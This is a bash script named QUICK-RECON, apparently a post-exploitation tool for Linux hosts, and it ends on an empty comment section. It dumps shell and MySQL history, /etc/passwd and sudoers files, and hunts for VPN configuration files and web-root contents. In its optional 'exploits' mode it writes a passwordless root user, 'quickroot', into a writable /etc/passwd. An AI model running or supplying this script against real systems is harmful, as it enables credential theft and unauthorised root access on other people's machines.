#!/bin/bash

#define RESET	"\033[0m"
#define BLACK	"\033[30m"
#define GREEN	"\033[32m"
#define RED	"\033[31m"

bhist_PATH=~/.bash_history 
msqlhist_PATH=~/.mysql_history
run_exploits=false

echo ----------------------------------------------------
echo                     QUICK-RECON
echo ----------------------------------------------------

echo "Starting quickrecon. Do you want to have quickrecon try exploits (y/n)?"
read usr_input

if [ "$usr_input" == "y" ]; then
	run_exploits=true
	echo "Quickrecon will use exploits"
else
	run_exploits=false
	echo "Quickrecon will NOT use exploits"
fi

printf "\n\n"
printf "System Data...\n\n"

printf "uname -a:\n"
uname -a

printf "\ndf -a:\n"
df -a

printf "\nwhoami:\n"
whoami

printf "\nfinger:\n"
finger

printf "\nw:\n"
w

printf "\n\n"

# -----------------------------------------------------------------------
# Check for bash_history
echo Checking for $bhist_PATH
if [ ! -f $bhist_PATH ]; then
	printf "$bhist_PATH not found.\n";
	printf "Trying locate...\n"
	locate .bash_history
else
	printf "File found:\n";
	cat $bhist_PATH
fi
printf "\n\n"


# -----------------------------------------------------------------------
# Check for mysql_history
echo Checking for $msqlhist_PATH
if [ ! -f $msqlhist_PATH ]; then
	printf "$msqlhist_PATH not found.\n"
	printf "Trying locate...\n"
	locate .mysql_history
else
	printf "File found:\n"
	cat $msqlhist_PATH
fi
printf "\n\n"


# -----------------------------------------------------------------------
# Check and dump /etc/passwd
echo Checking for /etc/passwd
if [ ! -f /etc/passwd ]; then
	printf "Could not find file. Trying locate...\n"
	locate passwd
else
	printf "File found:\n"
	cat /etc/passwd

	if [ "$run_exploits" == true ]; then
		printf "Run-Exploits is on... Checking permissions on /etc/passwd...\n"
		ls -al /etc/passwd
		if [ -w /etc/passwd ]; then
			printf "\t/etc/passwd is writable by this user.\n"
			printf "\tAttempting to inject passwordless root user with username quickroot...\n"
			echo "quickroot::0:0:quickroot:/root:/bin/bash" >> /etc/passwd
			printf "\tAttempt complete. Try: su quickroot\n"
			printf "Press any key to continue...\n"
			read usr_input

		else
			printf "\t/etc/passwd is NOT writable -- Can't inject root user.\n"
		fi
	fi
fi

printf "\n\n"


# -----------------------------------------------------------------------
# Check and dump sudoers
echo Checking for sudoers
if [ ! -f /etc/sudoers ]; then
	printf "Could not find file. Trying locate...\n"
	locate sudoers
else
	printf "File found:\n"
	cat /etc/sudoers
fi
printf "\n\n"

echo Listing /etc/sudoers.d/
ls -al /etc/sudoers.d/
printf "\n\n"


# -----------------------------------------------------------------------
# Search for files of note...

echo Looking for .ovpn files...
locate *.ovpn

printf "\n\n"

echo Listing files in /var/www/html...
ls -al /var/www/html

printf "\n\n"

# -----------------------------------------------------------------------
#






















